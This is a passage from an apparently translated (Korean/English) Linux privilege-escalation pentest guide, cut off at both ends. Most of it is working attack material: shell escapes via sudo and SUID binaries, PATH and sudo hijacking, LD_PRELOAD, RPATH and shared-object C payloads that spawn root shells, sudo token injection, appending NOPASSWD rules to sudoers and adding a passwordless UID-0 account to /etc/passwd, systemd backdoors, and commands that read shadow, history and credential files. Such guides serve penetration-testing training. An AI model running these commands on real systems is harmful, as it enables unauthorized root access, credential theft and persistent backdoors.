자신이 **who**인지, 어떤 **privileges**를 가지고 있는지, 시스템에 어떤 **users**가 있는지, 어떤 사용자가 **login**할 수 있는지, 그리고 어떤 사용자가 **root privileges**를 가지고 있는지 확인하세요:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

일부 Linux 버전은 **UID > INT_MAX**인 사용자가 권한 상승을 할 수 있게 해주는 버그의 영향을 받았습니다. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**다음 명령으로 악용하세요:** **`systemd-run -t /bin/bash`**

### 그룹

root 권한을 부여할 수 있는 **어떤 그룹의 구성원인지 확인하세요:**


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### 클립보드

클립보드 안에 흥미로운 것이 있는지 확인하세요(가능한 경우)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 비밀번호 정책
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

환경의 **비밀번호를 알고 있다면** 그 비밀번호를 사용해 **각 사용자로 로그인해 보세요**.

### Su Brute

If don't mind about doing a lot of noise and `su` and `timeout` binaries are present on the computer, you can try to brute-force user using [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) with `-a` parameter also try to brute-force users.

## Writable PATH abuses

### $PATH

만약 **$PATH의 어떤 폴더에 쓰기가 가능하다면** 해당 쓰기 가능한 폴더 안에 실행될 명령어 이름으로 **backdoor를 생성**해 다른 사용자(가능하면 root)가 실행할 때 권한을 상승시킬 수 있습니다. 단, 그 명령은 **여러분의 쓰기 폴더보다 앞서 위치한** 폴더에서 로드되지 않아야 합니다.

### SUDO and SUID

sudo로 특정 명령을 실행할 수 있거나 해당 바이너리에 suid 비트가 설정되어 있을 수 있습니다. 다음으로 확인하세요:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
일부 **예상치 못한 명령은 파일을 읽고/또는 쓰거나 심지어 명령을 실행할 수 있습니다.** 예를 들어:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 구성은 사용자가 암호를 알지 못한 채 다른 사용자의 권한으로 일부 명령을 실행하도록 허용할 수 있습니다.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
이 예제에서 사용자 `demo`는 `vim`을 `root` 권한으로 실행할 수 있으므로, root 디렉터리에 ssh 키를 추가하거나 `sh`를 호출하여 shell을 얻는 것은 매우 쉽습니다.
```
sudo vim -c '!sh'
```
### SETENV

이 지시문은 사용자가 어떤 것을 실행하는 동안 **환경 변수를 설정**할 수 있게 합니다:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
이 예시는 **HTB 머신 Admirer를 기반으로** 하며, 스크립트를 root로 실행하는 동안 임의의 python library를 로드하기 위해 **PYTHONPATH hijacking**에 **취약했습니다**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo 실행 경로 우회

**Jump**로 다른 파일을 읽거나 **symlinks**를 사용하세요. 예: sudoers 파일에서: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
만약 **wildcard**가 사용되면 (\*), 훨씬 더 쉽습니다:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**대응책**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo 명령/SUID 바이너리에서 명령 경로가 없는 경우

만약 **sudo 권한**이 단일 명령에 대해 **경로를 지정하지 않고** 부여되어 있다면: _hacker10 ALL= (root) less_ PATH 환경 변수를 변경하여 이를 악용할 수 있다.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
이 기법은 **suid** binary **경로를 지정하지 않고 다른 명령을 실행하는 경우(항상** _**strings**_ **로 이상한 SUID binary의 내용을 확인하세요)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary (명령 경로 있음)

만약 **suid** binary가 **경로를 지정하여 다른 명령을 실행하는 경우**, suid 파일이 호출하는 명령 이름으로 **export a function**을 시도할 수 있습니다.

예를 들어, 만약 suid binary가 _**/usr/sbin/service apache2 start**_ 를 호출한다면, 해당 명령 이름으로 함수를 생성하고 export해야 합니다:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
그런 다음 suid 바이너리를 호출하면 이 함수가 실행됩니다

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 환경 변수는 로더가 표준 C 라이브러리(`libc.so`)를 포함한 다른 라이브러리보다 먼저 로드하도록 하나 이상의 공유 라이브러리(.so 파일)를 지정하는 데 사용됩니다. 이 과정을 라이브러리 프리로딩이라고 합니다.

그러나 이 기능이 악용되는 것을 방지하고 시스템 보안을 유지하기 위해, 특히 **suid/sgid** 실행 파일과 관련하여 시스템은 특정 조건을 강제합니다:

- 로더는 실제 사용자 ID (_ruid_)가 유효 사용자 ID (_euid_)와 일치하지 않는 실행 파일에 대해서는 **LD_PRELOAD**를 무시합니다.
- **suid/sgid**가 설정된 실행 파일의 경우, **suid/sgid**로 설정된 표준 경로에 있는 라이브러리만 프리로드됩니다.

권한 상승은 당신이 `sudo`로 명령을 실행할 수 있고 `sudo -l`의 출력에 **env_keep+=LD_PRELOAD** 문구가 포함되어 있는 경우 발생할 수 있습니다. 이 설정은 `sudo`로 명령을 실행할 때도 **LD_PRELOAD** 환경 변수가 유지되어 인식되게 하여, 잠재적으로 권한이 상승된 상태에서 임의 코드가 실행되도록 만들 수 있습니다.
```
Defaults        env_keep += LD_PRELOAD
```
다음 경로로 저장: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
그런 다음 **compile it**을(를) 사용하여:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
마지막으로, **escalate privileges** 실행
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 공격자가 **LD_LIBRARY_PATH** env 변수를 제어할 수 있다면 유사한 privesc를 악용할 수 있습니다. 이는 라이브러리를 검색할 경로를 공격자가 제어하기 때문입니다.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

특이해 보이는 **SUID** 권한을 가진 binary를 발견했을 때, 해당 binary가 **.so** 파일을 제대로 로드하는지 확인하는 것이 좋습니다. 다음 명령어를 실행하여 확인할 수 있습니다:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
예를 들어, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 같은 오류가 발생하면 잠재적인 악용 가능성이 있음을 시사합니다.

이를 악용하려면 _"/path/to/.config/libcalc.c"_ 같은 C 파일을 생성하고 다음 코드를 포함시키면 됩니다:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
이 코드는 컴파일되어 실행되면 파일 권한을 조작하고 권한이 상승된 셸을 실행하여 권한을 상승시키는 것을 목표로 합니다.

다음 명령으로 위의 C 파일을 shared object (.so) 파일로 컴파일하세요:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
마지막으로, 영향을 받은 SUID 바이너리를 실행하면 exploit이 트리거되어 잠재적으로 시스템 침해가 발생할 수 있습니다.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
이제 우리가 쓰기 가능한 폴더에서 라이브러리를 로드하는 SUID binary를 찾았으니, 해당 폴더에 필요한 이름으로 라이브러리를 생성합시다:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
다음과 같은 오류가 발생하면
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
이는 생성한 라이브러리에 `a_function_name`이라는 함수가 있어야 한다는 의미입니다.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 는 공격자가 로컬 보안 제한을 우회하는 데 악용할 수 있는 Unix 바이너리의 선별된 목록입니다. [**GTFOArgs**](https://gtfoargs.github.io/) 는 명령어에 **인수만 주입할 수 있는** 경우에 대한 동일한 자료입니다.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Sudo 토큰 재사용

비밀번호는 없지만 **sudo access**가 있는 경우, **sudo 명령 실행을 기다렸다가 세션 토큰을 가로채는** 방식으로 권한을 상승시킬 수 있습니다.

권한 상승 요구사항:

- 이미 사용자 "_sampleuser_"로 셸을 가지고 있어야 합니다
- "_sampleuser_"는 **`sudo`를 사용**하여 **마지막 15분** 이내에 무언가를 실행했어야 합니다(기본적으로 이는 비밀번호 없이 `sudo`를 사용할 수 있게 해주는 sudo 토큰의 기간입니다)
- `cat /proc/sys/kernel/yama/ptrace_scope`가 0이어야 합니다
- `gdb`에 접근할 수 있어야 합니다(업로드할 수 있어야 함)

(임시로 `ptrace_scope`를 활성화하려면 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`를 사용하거나 `/etc/sysctl.d/10-ptrace.conf`를 영구적으로 수정하고 `kernel.yama.ptrace_scope = 0`으로 설정하면 됩니다)

이 모든 요구사항이 충족되면, **다음을 사용해 권한을 상승시킬 수 있습니다:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- 첫 번째 익스플로잇 (`exploit.sh`)은 _/tmp_에 `activate_sudo_token` 바이너리를 생성합니다. 이를 사용해 **세션에서 sudo 토큰을 활성화**할 수 있습니다(자동으로 root 쉘이 주어지지는 않습니다. `sudo su`를 실행하세요):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **두 번째 exploit** (`exploit_v2.sh`) 는 _/tmp_에 **root가 소유하고 setuid가 설정된** sh shell을 생성합니다
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- The **third exploit** (`exploit_v3.sh`)는 **sudoers file**을 생성하여 **sudo tokens**을 영구적으로 만들고 모든 사용자가 **sudo**를 사용할 수 있게 합니다
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

폴더 내 또는 폴더 안에 생성된 파일들에 대해 **쓰기 권한**이 있다면 바이너리 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)를 사용해 **사용자와 PID에 대한 sudo token을 생성할 수 있습니다**.\
예를 들어 파일 _/var/run/sudo/ts/sampleuser_를 덮어쓸 수 있고 그 사용자로 PID 1234인 셸을 가지고 있다면, 비밀번호를 알 필요 없이 다음과 같이 **sudo 권한을 얻을 수 있습니다**:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` 파일과 `/etc/sudoers.d` 안의 파일들은 누가 `sudo`를 어떻게 사용할 수 있는지 설정합니다.  
이 파일들은 **기본적으로 user root와 group root만 읽을 수 있습니다**.\
**If** you can **read** this file you could be able to **obtain some interesting information**, and if you can **write** any file you will be able to **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
쓰기 권한이 있으면 이 권한을 악용할 수 있다.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
이러한 권한을 악용하는 또 다른 방법:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD용 `doas` 등 `sudo` 바이너리의 대안이 있으니 `/etc/doas.conf`에서 설정을 확인하세요.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

만약 **사용자가 일반적으로 머신에 접속하고 `sudo`를 사용하여 권한을 상승시키는** 것을 알고 있고, 그 사용자 컨텍스트에서 셸을 얻었다면, 루트로서 먼저 당신의 코드를 실행한 뒤 사용자의 명령을 실행하는 **새로운 sudo 실행파일을 만들 수 있습니다**. 그런 다음 사용자 컨텍스트의 **$PATH를 수정**(예: 새로운 경로를 .bash_profile에 추가)하면 사용자가 sudo를 실행할 때 당신의 sudo 실행파일이 실행됩니다.

Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. 예를 들어[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

또는 다음과 같이 실행할 수 있습니다:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 공유 라이브러리

### ld.so

파일 `/etc/ld.so.conf`는 **로딩되는 구성 파일들이 어디에서 오는지**를 나타냅니다. 일반적으로 이 파일은 다음 경로를 포함합니다: `include /etc/ld.so.conf.d/*.conf`

이는 `/etc/ld.so.conf.d/*.conf`의 구성 파일들이 읽힌다는 뜻입니다. 이 구성 파일들은 **라이브러리가 검색될 다른 폴더들**을 가리킵니다. 예를 들어 `/etc/ld.so.conf.d/libc.conf`의 내용은 `/usr/local/lib`입니다. **이는 시스템이 `/usr/local/lib` 내부에서 라이브러리를 검색한다는 의미입니다**.

만약 어떤 이유로든 **사용자가 쓰기 권한**을 `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` 내부의 어떤 파일 또는 `/etc/ld.so.conf.d/*.conf`에 있는 구성 파일이 가리키는 폴더들 중 하나에 가지고 있다면 권한을 상승시킬 수 있습니다.\
다음 페이지에서 **이 잘못된 구성을 어떻게 악용하는지**를 확인하세요:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib을 `/var/tmp/flag15/`에 복사하면 `RPATH` 변수에 지정된 대로 이 위치에서 프로그램에 의해 사용됩니다.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
그런 다음 `/var/tmp`에 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`로 악성 라이브러리를 만듭니다.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 권한 (Capabilities)

Linux capabilities는 프로세스에 사용 가능한 root 권한의 **부분 집합**을 제공합니다. 이는 root **권한을 더 작고 구별되는 단위들로 분리**하는 효과가 있습니다. 이러한 각 단위는 개별적으로 프로세스에 부여될 수 있습니다. 이로써 전체 권한 집합이 축소되어 악용 위험이 감소합니다.\
다음 페이지를 읽어 **capabilities 및 이를 악용하는 방법**에 대해 더 알아보세요:


{{#ref}}
linux-capabilities.md
{{#endref}}

## 디렉터리 권한

디렉터리에서, **"execute" 비트**는 해당 사용자가 "**cd**"로 폴더에 들어갈 수 있음을 의미합니다.\
**"read"** 비트는 사용자가 **파일을 나열(list)**할 수 있음을 의미하고, **"write"** 비트는 사용자가 **파일을 삭제(delete)**하거나 **새 파일을 생성(create)**할 수 있음을 의미합니다.

## ACLs

Access Control Lists (ACLs)는 재량적 권한의 보조 계층을 나타내며, 전통적인 ugo/rwx 권한을 **overriding**할 수 있습니다. 이러한 권한은 소유자나 그룹에 속하지 않는 특정 사용자에게 권한을 허용하거나 거부함으로써 파일 또는 디렉터리 접근 제어를 향상시킵니다. 이 수준의 **granularity**는 보다 정밀한 접근 관리를 보장합니다. 자세한 내용은 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)를 참조하세요.

**부여**: 사용자 "kali"에게 파일에 대한 읽기 및 쓰기 권한:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**가져오기** 시스템에서 특정 ACLs를 가진 파일들:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## shell 세션 열기

**구버전**에서는 다른 사용자(**root**)의 일부 **shell** 세션을 **hijack**할 수 있습니다.\
**최신 버전**에서는 **connect**가 오직 **자신의 사용자**의 screen sessions에만 가능합니다. 그러나 **세션 내부의 흥미로운 정보**를 찾을 수 있습니다.

### screen sessions hijacking

**screen sessions 목록**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**세션에 연결**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

이 문제는 **오래된 tmux 버전**에서 발생했습니다. root가 생성한 tmux (v2.1) 세션을 non-privileged user로서 hijack할 수 없었습니다.

**tmux 세션 나열**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**session에 연결**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006년 9월부터 2008년 5월 13일 사이에 Debian 계열 시스템(예: Ubuntu, Kubuntu 등)에서 생성된 모든 SSL 및 SSH 키는 이 버그의 영향을 받을 수 있습니다.\
이 버그는 해당 OS에서 새로운 ssh 키를 생성할 때 발생하는데, **가능한 경우가 단지 32,768개에 불과했기 때문입니다**. 이는 모든 가능한 키를 계산할 수 있다는 것을 의미하며, **ssh public key를 가지고 있으면 해당하는 private key를 검색할 수 있습니다**. 계산된 가능한 키 목록은 다음에서 확인할 수 있습니다: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH 흥미로운 구성 값

- **PasswordAuthentication:** 비밀번호 인증이 허용되는지 여부를 지정합니다. 기본값은 `no`입니다.
- **PubkeyAuthentication:** public key 인증이 허용되는지 여부를 지정합니다. 기본값은 `yes`입니다.
- **PermitEmptyPasswords**: 비밀번호 인증이 허용될 때, 서버가 비어 있는 비밀번호 문자열을 가진 계정으로의 로그인을 허용하는지 여부를 지정합니다. 기본값은 `no`입니다.

### PermitRootLogin

root가 ssh로 로그인할 수 있는지 여부를 지정합니다. 기본값은 `no`입니다. 가능한 값:

- `yes`: root는 비밀번호와 private key를 사용해 로그인할 수 있습니다
- `without-password` 또는 `prohibit-password`: root는 private key로만 로그인할 수 있습니다
- `forced-commands-only`: root는 private key로만 로그인할 수 있으며 commands 옵션이 지정된 경우에만 가능합니다
- `no` : 허용 안함

### AuthorizedKeysFile

사용자 인증에 사용할 수 있는 public keys를 포함하는 파일을 지정합니다. `%h` 같은 토큰을 포함할 수 있으며, 이는 홈 디렉터리로 대체됩니다. **절대 경로를 지정할 수 있습니다** (경로가 `/`로 시작) 또는 **사용자 홈을 기준으로 한 상대 경로**. 예:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding을 사용하면 서버에 keys (without passphrases!)를 남겨두는 대신 **use your local SSH keys instead of leaving keys**할 수 있습니다. 따라서 ssh로 **jump**하여 **to a host**에 접속한 뒤, 거기서 **jump to another** host할 때 **initial host**에 있는 **key**를 **using**할 수 있습니다.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 흥미로운 파일들

### 프로필 파일

파일 `/etc/profile` 및 `/etc/profile.d/` 아래의 파일들은 사용자가 새 쉘을 실행할 때 실행되는 **스크립트들입니다**. 따라서, 이들 중 어느 하나라도 **작성하거나 수정할 수 있다면 권한 상승이 가능합니다**.
```bash
ls -l /etc/profile /etc/profile.d/
```
이상한 프로필 스크립트가 발견되면 **민감한 세부 정보**를 확인해야 합니다.

### Passwd/Shadow 파일

OS에 따라 `/etc/passwd` 및 `/etc/shadow` 파일은 다른 이름을 사용하거나 백업이 있을 수 있습니다. 따라서 **모두 찾아서** **읽을 수 있는지 확인**하여 파일 내부에 **hashes**가 있는지 확인하는 것이 좋습니다:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
간혹 `/etc/passwd` (또는 동등한 파일) 안에서 **password hashes**를 찾을 수 있습니다.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 쓰기 가능한 /etc/passwd

먼저, 다음 명령어들 중 하나로 password를 생성합니다.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
그런 다음 사용자 `hacker`를 추가하고 생성된 비밀번호를 설정합니다.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
예: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

이제 `su` 명령으로 `hacker:hacker`를 사용할 수 있습니다

또는 다음 줄을 사용하여 비밀번호 없는 더미 사용자를 추가할 수 있습니다.\
경고: 이로 인해 시스템의 현재 보안이 약화될 수 있습니다.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
참고: BSD 플랫폼에서는 `/etc/passwd`가 `/etc/pwd.db` 및 `/etc/master.passwd`에 위치하며, `/etc/shadow`는 `/etc/spwd.db`로 이름이 변경됩니다.

**몇몇 민감한 파일에 쓰기**가 가능한지 확인해야 합니다. 예를 들어, 어떤 **서비스 구성 파일**에 쓸 수 있나요?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
예를 들어, 머신이 **tomcat** 서버를 실행 중이고 **modify the Tomcat service configuration file inside /etc/systemd/,** 를 수정할 수 있다면, 다음 라인들을 수정할 수 있습니다:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
당신의 백도어는 tomcat이 다음에 시작될 때 실행됩니다.

### Check Folders

다음 폴더들은 백업이나 흥미로운 정보를 포함하고 있을 수 있습니다: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (마지막 항목은 읽을 수 없을 가능성이 높지만 시도해 보세요)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 이상한 위치/Owned 파일
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 최근 몇 분 내에 수정된 파일
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 파일
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 파일
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 숨겨진 파일
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH의 스크립트/바이너리**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **웹 파일**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **백업**
```bash
